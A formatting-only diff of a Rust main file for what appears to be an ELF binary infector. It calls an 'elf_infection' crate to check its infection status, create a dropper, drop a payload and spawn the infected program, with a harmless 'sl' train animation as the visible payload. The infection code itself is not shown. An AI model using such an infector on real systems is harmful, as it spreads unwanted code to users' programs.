@@ -1,11 +1,7 @@
-use sl::sl;
 use elf_infection::infect::{
-    get_own_infection_status,
-    create_dropper, 
-    drop_payload, 
-    spawn_infected_program,
-    InfectionStatus,
+    InfectionStatus, create_dropper, drop_payload, get_own_infection_status, spawn_infected_program,
 };
+use sl::sl;
 
 fn main() -> Result<(), Box<dyn std::error::Error>> {
     match get_own_infection_status() {
@@ -18,7 +14,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
 }
 
 fn fun_stuff() {
-    let sl_args : Vec<String> = vec![String::new();1];
+    let sl_args: Vec<String> = vec![String::new(); 1];
     sl(&sl_args);
 }
 
